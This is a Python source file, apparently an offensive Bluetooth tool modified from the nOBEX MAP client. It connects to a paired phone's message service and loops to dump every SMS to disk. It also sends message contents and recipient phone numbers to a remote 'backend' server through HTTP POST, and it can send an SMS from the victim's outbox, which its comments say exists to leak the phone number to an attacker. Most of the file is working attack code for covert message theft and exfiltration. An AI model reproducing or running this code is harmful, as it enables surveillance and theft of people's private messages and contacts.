# This code is a modified version of the mapclient released by nOBEX.
# Addes sms PUT functions, as well as relay and additional logic. 
# Author - sgxgsx

import os
from xml.etree import ElementTree
from nOBEX import headers
from nOBEX.common import OBEXError
from nOBEX.xml_helper import parse_xml
from collections import deque
from nOBEX.client import Client
from nOBEX.bluez_helper import find_service
from nOBEX import headers

from constants import get_SMS_MESSAGE_BEGIN, get_SMS_MESSAGE_END


import aiohttp
import asyncio


TYPE_SMS = "SMS"
TYPE_PHONE = "PHONE"



class MAPClient(Client):
    def __init__(self, address, port=None):
        if port is None:
            port = find_service("map", address)
        super(MAPClient, self).__init__(address, port)

    def connect(self):
        uuid = b'\xbb\x58\x2b\x40\x42\x0c\x11\xdb\xb0\xde\x08\x00\x20\x0c\x9a\x66'
        super(MAPClient, self).connect(header_list = [headers.Target(uuid)])




class MAPFunctions:
    def __init__(self, mapClient, backend, dest_dir) -> None:
        self.known = dict()
        self.recipients = dict()
        self.print_out = deque()
        self.hide_output = True
        self.mapClient = mapClient
        self.backend = backend
        self.dest_dir = dest_dir

    
    def dump_xml(self, element, file_name):
        fd = open(file_name, 'wb')
        fd.write(b'<?xml version="1.0" encoding="utf-8" standalone="yes" ?>\n')
        fd.write(ElementTree.tostring(element, 'utf-8'))
        fd.close()
    
    def change_name_of_the_device(self, new_name):
        pass

    # nOBEX function to get the file
    def get_file(self, src_path, dest_path, verbose=True, folder_name=None):
        if verbose:
            if folder_name is not None:
                print("Fetching %s/%s" % (folder_name, src_path))
            else:
                print("Fetching %s" % src_path)

        # include attachments, use UTF-8 encoding
        req_hdrs = [headers.Type(b'x-bt/message'),
                    headers.App_Parameters(b'\x0A\x01\x01\x14\x01\x01')]
        hdrs, card = self.mapClient.get(src_path, header_list=req_hdrs)
        with open(dest_path, 'wb') as f:
            if not self.hide_output:
                print(card)
                if self.backend is not None:
                    self.relay_to_backend(str(card), TYPE_SMS)
            f.write(card)

    # nOBEX function to dump the directory
    def dump_dir(self, src_path, dest_path):
        src_path = src_path.strip("/")
        hdrs, cards = self.mapClient.get(src_path, header_list=[headers.Type(b'x-bt/MAP-msg-listing')])
        
        if len(cards) == 0:
            return

        try:
            os.makedirs(dest_path)
        except OSError:
            pass

        # Parse the XML response to the previous request.
        # Extract a list of file names in the directory
        # If SMS message is not known append it to the known list, find phone number and append it to the print_out list
        names = []
        root = parse_xml(cards)
        self.dump_xml(root, "/".join([dest_path, "mlisting.xml"]))
        for card in root.findall("msg"):
            names.append(card.attrib["handle"])
            if self.recipients.get(card.attrib["recipient_addressing"], None) is None:
                self.recipients[card.attrib["recipient_addressing"]] = True
                self.print_out.append(card.attrib["recipient_addressing"])
        self.mapClient.setpath(src_path)

        if len(self.print_out) > 0:
            print("Leak phone number/email: ")
            while self.print_out:
                #print(self.print_out[0])
                # relay the message to backend
                
                if self.backend is not None:
                    self.relay_to_backend(self.print_out[0], TYPE_PHONE)
                self.print_out.popleft()

        for name in names:
            if self.known.get(name, False) is False:
                print("found new message {}".format(name))
                self.known[name] = True
                self.get_file(name, "/".join([dest_path, name]), folder_name=src_path)


        depth = len([f for f in src_path.split("/") if len(f)])
        for i in range(depth):
            self.mapClient.setpath(to_parent=True)

    # Loop through all the directories and dump the SMS messages.
    # Loop stops only on Ctrl+C
    # First loop doesn't relay information to the server. Only stores the information at dest_dir
    def dump_and_monitor(self, dest_dir):
        dirs, x = self.mapClient.listdir()

        self.hide_output = True
        while True:
            for d in dirs:
                self.dump_dir(d, dest_dir + "telecom/msg/" + d)
            self.hide_output = False   # if set to False then we should relay the information to the server

    # Send an SMS message to the recipient_phone_number.
    # Allows to leak phone number to the attacker.
    def send_sms_message(self, recipient_phone_number):
        try:
            message = get_SMS_MESSAGE_BEGIN() + bytes(recipient_phone_number, 'utf-8') + get_SMS_MESSAGE_END()
            req_hdrs = [headers.Type(b'x-bt/message'),
            headers.App_Parameters(b'\x0A\x01\x01\x14\x01\x01')]
            self.mapClient.put('telecom/msg/outbox', message, req_hdrs)
        except OBEXError as e:
            print(e)
            print("Error sending SMS message")


    @staticmethod
    def get_map_client(device_address):
        mapClient = MAPClient(device_address)
        mapClient.connect()
        mapClient.setpath("telecom")
        mapClient.setpath("msg")
        return mapClient
    
    def get_map_client_object(self):
        return self.mapClient
    
    def set_map_client_object(self, mapClient):
        self.mapClient = mapClient

    # Relay the information to the backend server.
    # Relays SMS messages or phone numbers to the server.
    def relay_to_backend(self, content, type):
        async def relay_to_backend_async(content, url, type):
            json_body = {"content": content, "type": type}
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json=json_body) as response:  # TODO try just session.post(url, json=json_body) without with
                    pass  # Do nothing with the response, don't wait for it

        asyncio.run(relay_to_backend_async(content, self.backend, type))
        

